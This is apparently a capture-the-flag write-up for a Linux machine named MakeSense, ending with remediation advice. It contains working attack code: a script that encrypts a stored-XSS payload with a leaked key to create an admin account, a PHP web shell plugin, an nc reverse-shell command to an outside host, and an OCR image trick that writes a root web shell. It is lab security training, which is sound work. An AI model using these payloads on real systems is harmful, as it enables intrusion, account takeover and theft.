| Property         | Value                                                                                                                                                  |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **OS**           | Linux                                                                                                                                                  |
| **Difficulty**   | Medium                                                                                                                                                 |
| **Release Date** | 2026-04-07                                                                                                                                             |
| **State**        | Active                                                                                                                                                 |
| **IP**           | 10.129.42.84                                                                                                                                           |
| **Techniques**   | WordPress user enumeration, directory listing disclosure, stored XSS via leaked client-side key, malicious plugin upload, OCR arbitrary file write RCE |
| **Tags**         | #web #privesc #linux #wordpress #ocr                                                                                                                   |

---
## Summary

MakeSense is a medium Linux machine hosting a WordPress instance on port 443. WordPress user enumeration discloses three accounts: `admin`, `walter`, and `jake`. The site exposes a "voice call" feature that lets a visitor record an audio message, which is transcribed and stored under the WordPress uploads directory. Directory listing is enabled on `/wp-content/uploads`, exposing a recording in which `jake` reads out his WordPress credentials, recovered by playing back the auto-generated transcript. Logging in as `jake` and reviewing the theme's client-side JavaScript reveals a symmetric encryption key hardcoded in `whisper-wrapper.js`, used to encrypt the transcription payload before it is submitted to the `save_voice_results` AJAX action. Because the key is shipped to the browser of any authenticated user, an arbitrary payload (including a JavaScript snippet) can be encrypted with the same key and submitted directly to the endpoint, bypassing the legitimate client-side recorder entirely. This achieves stored XSS: when an administrator later reviews the saved voice message from `wp-admin`, the injected script executes in their session and silently creates a new administrator account. Logging in with the new account, a malicious plugin containing a PHP web shell is uploaded, granting code execution as `www-data`. `wp-config.php` discloses plaintext credentials for `walter`, which are reused for SSH access. Process and port enumeration reveals an internal OCR service running as `root`, bound to loopback on port 8001, reachable with `walter`'s reused credentials . After forwarding the port, the service's drawing-to-text feature is abused by creating an image whose visible text is PHP web shell code. The image is submitted in place of a legitimate handwriting sample, and the OCR-recognized text is saved to disk under an attacker-controlled filename with a `.php` extension, granting remote code execution as `root`.

---
## Enumeration

```
echo '10.129.42.84 makesense.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sV -sC makesense.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-10 17:49 EDT
Nmap scan report for makesense.htb (10.129.42.84)
Host is up (0.084s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-generator: WordPress 7.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Agency LLC
| tls-alpn: 
|_  http/1.1
8001/tcp filtered vcom-tunnel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 32.28 seconds
```

### WordPress Enumeration

```
wpscan --url https://makesense.htb --enumerate --disable-tls-checks --no-update
```

```
[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
 | Found By: Meta Generator (Passive Detection)
 |  - https://makesense.htb/, Match: 'WordPress 7.0'

[+] WordPress theme in use: webagency
 | Location: https://makesense.htb/wp-content/themes/webagency/
 | Description: Modern web development agency theme with Tailwind CSS...

[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php

[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] walter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jake
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

WPScan confirms WordPress 7.0 running the custom `webagency` theme, three usable usernames (`admin`, `walter`, `jake`), and that **directory listing is enabled** on `/wp-content/uploads/`.

### Directory Enumeration

Browsing the uploads directory structure reveals a recorded voice message left behind by a user testing the site's voice-call feature:

![](./screens/1.png)

```
https://makesense.htb/wp-content/uploads/2026/01/voice-message.wav
```

### Audio Transcription

Uploading `voice-message.wav` through NoteGPT (Speech to Text) recovers the audio content:

![](./screens/2.png)

> Hey, this is Jake. I'm testing the new feature, and it's exciting. I'm going there. Oops. Log in. Um, Jake? Clear. Light. Nice. Smooth. Four. Nine. Two. Three.

Jake wordpress credentials:

```
jake:ClearLightNiceSmooth4923
```

---
## Foothold

### Source Code Enumeration

Logging in to WordPress as `jake` and reviewing the page source shows the voice-call widget is loaded from the `webagency` theme, backed by an AJAX action (`save_voice_results`) and a client-side transcription library:

![](./screens/3.png)

```
view-source:https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0
```

`whisper-wrapper.js` uses [Transformers.js](https://huggingface.co/docs/transformers.js) to run Whisper transcription entirely in the browser, then encrypts the resulting transcript before sending it to the server. The encryption key is hardcoded directly in the shipped JavaScript:

![](./screens/4.png)

```
bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI
```

Since this key is delivered to the browser of any logged-in user, anyone who can view the page source can encrypt an arbitrary payload.

### Stored XSS via Leaked Encryption Key

The `save_voice_results` AJAX action expects an `encrypted_payload` parameter: a base64 blob of `IV || ciphertext || tag`, encrypted with AES-GCM using `SHA256(ENCRYPTION_KEY)` as the key. Server-side, this is decrypted back into a JSON object containing a `transcription` and a `summary` field, which are then stored against a voice-message post for later review in `wp-admin`.

Because the encryption key is exposed client-side and the decrypted `transcription` field is not sanitized before being rendered wherever an administrator reviews saved voice messages, an attacker can encrypt a payload containing a `<script>` tag instead of a real transcript. The endpoint has no way to distinguish it from a legitimate submission, so the malicious content is stored as-is. When an administrator opens the voice message to review it, the injected script executes in their authenticated session. 

### Exploitation

A new post is created by using the voice-call feature:

![](./screens/5.png)

This script exploits a stored XSS vulnerability in the WordPress voice-call feature: it encrypts a malicious JavaScript payload (disguised as a "transcription") using the site's leaked AES-GCM key, then submits it directly to the `save_voice_results` AJAX handler using a stolen session cookie, so that when an admin later views the message, the script runs in their browser and creates a new administrator account via the user-creation form.

```python
import hashlib, os, base64, json
import requests
from Crypto.Cipher import AES

# --- config ---
TARGET = "https://makesense.htb"
ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"
NONCE = "60d5f25060"   # save_voice_results AJAX nonce, grabbed from jake's session
POST_ID = "70"         # ID of a voice-message post owned by jake

COOKIES = {
    "wordpress_logged_in_666f3cbf9610031df176da93aa83bc38": "jake%7C1783895330%7C7rmKiIEOBwzptZ9jpy7aopcDbvCXcRon16aQHJF4ktd%7Ca8a1b3e65c55b5099f266866d8d633713cd5be7ab54ff2eb8401e9d12277a3a0",
    "wordpress_sec_666f3cbf9610031df176da93aa83bc38": "jake%7C1783895330%7C7rmKiIEOBwzptZ9jpy7aopcDbvCXcRon16aQHJF4ktd%7C904e740c7c9e00320d5f1e4b83caed72d46f60eeb335485ec5b63bf8f74962a5",
}

# Payload runs in the admin's browser once they review the voice message:
# grab a fresh add-user nonce, then submit the Add New User form as admin.
XSS = "<script>fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{let n=t.match(/_wpnonce_create-user\" value=\"([a-f0-9]+)\"/)[1];fetch('/wp-admin/user-new.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=createuser&_wpnonce_create-user='+n+'&user_login=pwn&email=pwn@pwn.htb&pass1=Pwn12345&pass2=Pwn12345&role=administrator&createuser=Add+User'})})</script>"

# --- crypto: replicate the client's AES-GCM scheme with the leaked key ---
key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()
payload = json.dumps({"transcription": XSS, "summary": "test"}).encode()
iv = os.urandom(12)
cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
ct, tag = cipher.encrypt_and_digest(payload)
encrypted_payload = base64.b64encode(iv + ct + tag).decode()

# --- submit directly to the AJAX endpoint, bypassing the legit recorder ---
resp = requests.post(
    f"{TARGET}/wp-admin/admin-ajax.php",
    verify=False,
    cookies=COOKIES,
    data={
        "action": "save_voice_results",
        "nonce": NONCE,
        "post_id": POST_ID,
        "encrypted_payload": encrypted_payload,
    },
)
print(resp.status_code)
print(resp.text)
```

```shell
python3 script2.py
200
{"success":true,"data":{"message":"Results saved successfully!","post_id":70}}
```

Once an administrator opens the voice message in `wp-admin` to review it, the stored script fires and creates a new administrator account (`pwn:Pwn12345`) in the background.

![](./screens/6.png)

### Malicious Plugin Upload

Logged in as the newly created administrator, arbitrary code execution is achieved by uploading a malicious plugin containing a PHP web shell:

```php
<?php
/**
 * Plugin Name: Shell
 * Description: test
 */
system($_REQUEST['cmd']);
?>
```

```shell
zip shell.zip shell.php
```

Uploading the plugin through the standard WordPress "Add New Plugin" upload flow:

![](./screens/7.png)

## Access as www-data

```shell
curl -sk 'https://makesense.htb/wp-content/plugins/shell/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.136%201111%20%3E%2Ftmp%2Ff'
```

```
nc -lvnp 1111 
listening on [any] 1111 ...
connect to [10.10.15.136] from (UNKNOWN) [10.129.42.84] 42290
sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@makesense:/var/www/html/wp-content/plugins/shell$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A shell is obtained as `www-data`.

---
## Lateral Movement

### From www-data to walter

```
www-data@makesense:/var/www/html$ cat wp-config.php
<?php
// SQLite database configuration
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
...
```

`wp-config.php` discloses plaintext credentials, `walter:JbhHDAEgXvri3!`, which grant SSH access to the host.

---
## User Flag

```
ssh walter@makesense.htb                       
walter@makesense.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...
walter@makesense:~$ cat user.txt
eb0****************************5a1
```

---
## Privilege Escalation

### Enumeration

Active listening ports confirm an internal service bound to loopback on port 8001:

```
walter@makesense:~$ ss -tlpn
State                Recv-Q  Send-Q       Local Address:Port           Peer Address:Port
LISTEN               0       4096         127.0.0.54:53                0.0.0.0:*
LISTEN               0       4096         127.0.0.53%lo:53             0.0.0.0:*
LISTEN               0       511          0.0.0.0:443                  0.0.0.0:*
LISTEN               0       4096         127.0.0.1:8001               0.0.0.0:*
LISTEN               0       4096         0.0.0.0:22                   0.0.0.0:*
LISTEN               0       511          0.0.0.0:80                   0.0.0.0:*
```

Process enumeration confirms the service runs as `root`, launched via an init script and served by PHP's built-in web server:

```
walter@makesense:~$ ps aux | grep root
root        1395  0.0  0.0   2800  1816 ?    Ss   21:47   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
root        1397  0.0  0.0   7340  3580 ?    S    21:47   0:03 /bin/bash /root/.scripts/start_ocr4.sh
root        1404  0.0  0.7 228488 30432 ?    S    21:47   0:00 php -S 127.0.0.1:8001 -t /root/ocr4/
root        1409  0.0  0.7 232504 31600 ?    Ss   21:47   0:00 /usr/sbin/apache2 -k start
```

`/root/ocr4/` is served directly by `php -S`, running under `root`'s privileges, and is only reachable from loopback.

### OCR Arbitrary File Write

Forwarding the port and browsing to it presents a drawing-to-text tool, protected by HTTP Basic Auth:

```shell
ssh walter@makesense.htb -L 8001:localhost:8001
```

`walter`'s SSH credentials are reused for the Basic Auth prompt (`walter:JbhHDAEgXvri3!`), granting access to the app:

![](./screens/8.png)

The tool lets a user sketch a word or short phrase on an HTML canvas, submits the drawing as a base64-encoded PNG to the backend, runs it through Tesseract OCR, and returns the recognized plain text so it can be saved to a file. Two things make this exploitable:

1. The backend accepts **any** base64-encoded image as the "canvas drawing", it doesn't have to originate from the on-page canvas widget.
2. The recognized text can be saved to disk under a client-influenced filename, and the extension of that filename is not restricted server-side (it does not have to be `.txt`).

Combining both, an image whose visible content is literal PHP code can be submitted instead of a handwriting sample. Tesseract faithfully OCRs the PHP source as plain text, and that text can then be persisted to a `.php` file inside a directory served by the same PHP built-in server achieving code execution as `root`, the user the OCR service runs as.

### Exploitation

An image containing PHP web shell code as its visible text is generated locally:

```python
from PIL import Image, ImageDraw, ImageFont

img = Image.new('RGB', (600, 100), color='white')
draw = ImageDraw.Draw(img)
font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 28)
draw.text((10, 30), "<?php system($_GET['cmd']); ?>", fill='black', font=font)
img.save('shell.png')
```

```shell
base64 -w 0 shell.png > shell.b64
```

A legitimate "Recognize" request is captured in Burp Suite and the `canvas_image` parameter is replaced with the URL-encoded base64 data of `shell.png`:

![](./screens/9.png)

```
POST / HTTP/1.1
Host: localhost:8001
Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh
Cookie: PHPSESSID=plf0a8293rppvqn1havaqp1lbf
Content-Type: application/x-www-form-urlencoded

canvas_image=data%3Aimage%2Fpng%3Bbase64%2C<...base64 PNG data of shell.png...>
```

The response returns the recognized text extracted by Tesseract from the image . The result is then saved, with the destination filename's extension changed from the default to `.php`:

![](./screens/10.png)

The saved file lands in a web-accessible directory served by the root-owned PHP process:

```shell
curl -s 'http://localhost:8001/saved/shell.php?cmd=id'
uid=0(root) gid=0(root) groups=0(root)
```

---
## Root Flag

```shell
curl -s 'http://localhost:8001/saved/shell.php?cmd=cat+/root/root.txt'
625****************************810
```

---
## Remediation

- **Directory listing on uploads:** Disable directory listing (`Options -Indexes`) on `/wp-content/uploads/` and any other web-served directory. Recordings, exports, and other user-generated artifacts should never be browsable.
- **Sensitive data in audio recordings:** Educate users not to speak credentials aloud during feature testing, and treat any uploaded media as potentially sensitive; restrict access to authenticated, authorized users only.
- **Client-side secrets:** Never embed encryption or signing keys used for server-side trust decisions inside client-side JavaScript. If a client must encrypt data for the server, treat the server-side handler as though the "encryption" provides no authenticity or integrity guarantees, a key visible to the browser is a key visible to the attacker.
- **Stored XSS via AJAX-submitted content:** Sanitize and/or HTML-encode any user-controlled value (including values decrypted server-side from a client payload) before it is rendered in an authenticated admin context. Apply output encoding at render time, not just input validation at submission time.
- **Unrestricted plugin uploads:** Restrict plugin/theme installation to trusted administrators and consider disabling the plugin/theme editor and installer in production (`DISALLOW_FILE_MODS`).
- **Plaintext credentials in `wp-config.php`:** Restrict file permissions on `wp-config.php` so it is not readable by the web server user beyond what's strictly required, and avoid reusing WordPress database credentials for OS-level accounts.
- **Credential reuse across services:** `walter`'s password was valid for SSH, WordPress database access, and the internal OCR service's Basic Auth. Use distinct credentials per service.
- **Root-owned internal service with unrestricted file write:** The OCR service should not run as `root`. Any endpoint that writes recognized/user-influenced content to disk must strictly whitelist output file extensions (e.g., `.txt` only) and write to a directory that is never interpreted by the web server as executable code.

---
## References

- [WordPress `admin-ajax.php` Reference](https://developer.wordpress.org/plugins/javascript/ajax/)
- [OWASP — Stored Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
- [Tesseract OCR Documentation](https://tesseract-ocr.github.io/)
- [Transformers.js — Client-Side Whisper Transcription](https://huggingface.co/docs/transformers.js)